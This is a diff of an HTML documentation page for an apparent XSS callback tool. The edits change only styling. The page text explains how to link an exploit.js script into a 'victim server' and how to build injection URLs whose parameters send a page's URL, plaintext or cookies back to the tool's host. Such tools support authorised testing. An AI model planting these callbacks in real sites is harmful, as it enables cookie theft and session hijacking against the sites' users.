@@ -5,25 +5,25 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<link href="/styles/tailwind.css" rel="stylesheet">
 	</head>
-	<body class="bg-slate-400/90 p-5 md:p-0 md:ml-10 mt-5 flex flex-col gap-20">
+	<body class="bg-slate-400/90 p-2 md:p-0 md:ml-10 mt-5 flex flex-col gap-20">
 		<!-- <body class="bg-slate-400 ml-10 mt-5 flex flex-col gap-20"></body> -->
 		<nav class="absolute top-0 left-0 p-4 mb-5">
 			<a href="/"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24"><path fill="black" d="m7.825 13l5.6 5.6L12 20l-8-8l8-8l1.425 1.4l-5.6 5.6H20v2z"/></svg></a>
 		</nav>
-		<div>
+		<div class="">
 			<h1 class="text-5xl font-bold mb-5 mt-10">Get Started</h1>
 			<p class="mb-5">Please make sure that you have set up all your variables inside the .env file before reading</p>
 			<div class="flex space-y-10 flex-col">
 				<div class="flex space-x-5 flex-col text-lg">
 					
-					<h3 class="text-2xl font-bold leading-7">Endpoints:</h3>
+					<h3 class="text-2xl font-bold leading-8">Endpoints:</h3>
 					<ul>
 						<li><b>/logger/{your_code}</b> : This is where you make normal requests to (for request logging).</li>
 						<li><b>/</b>: This is where you request to generate injection alerts. There are query string parameters such as <span class="text-stone-100">url</span>, <span class="text-stone-100">by</span>, <span class="text-stone-100">code</span>, <span class="text-stone-100">plaintext</span>, <span class="text-stone-100">cookie</span>, and <span class="text-stone-100">b64</span>.</li>
 						<li><b>/exploit.js</b>: This is where the exploit.js file lies, you can link this js file remotely to the victim server with the script tag.</li>
 					</ul>
 				</div>
-				<div class="flex space-x-5 flex-col text-lg leading-7">
+				<div class="flex space-x-5 flex-col text-lg leading-8">
 					<b>Parameters:</b>
 					<ul>
 						<li><b>url</b>: Specifies location of the current document/webpage</li>
@@ -46,7 +46,7 @@
 						<li>1.) You must first decide which action parameter to use <b>plaintext, b64, or cookie, or none (leave blank)</b></li>
 						<li>2.) In this case I choose <b>plaintext</b></li>
 						<li>3.) Then remember the required parameters: <b>url, code, and by</b></li>
-						<li>4.) Craft the URL with those, <b>http://localhost:4000/?url=victim_url&code=yourcode&by=yourusername&plaintext=</b></li>
+						<li>4.) Craft the URL with those, <b class="break-words">http://localhost:4000/?url=victim_url&code=yourcode&by=yourusername&plaintext=</b></li>
 						<li>5.) Inject this inside of an html tag or javascript code that will make a request to this url</li>
 					</ul>
 				</div>
@@ -54,9 +54,9 @@
 					<h3 class="text-lg font-bold">How to use the logger webhook:</h3>
 					<ul>
 						<li>1.) <b>code</b> is the only required parameter for this</li>
-						<li>2.) Craft the URL to the logger endpoint <b>http://localhost:4000/logger/{your_code}/{custom_message}</b></li>
+						<li>2.) Craft the URL to the logger endpoint <b class="break-words">http://localhost:4000/logger/{your_code}/{custom_message}</b></li>
 						<br>
-						<li>Example: <b>http://localhost:4000/logger/123456/anythingblahblah</b></li>
+						<li>Example: <b class="break-words">http://localhost:4000/logger/123456/anythingblahblah</b></li>
 					</ul>
 				</div>
 				<div class="flex space-x-5 flex-col text-lg">
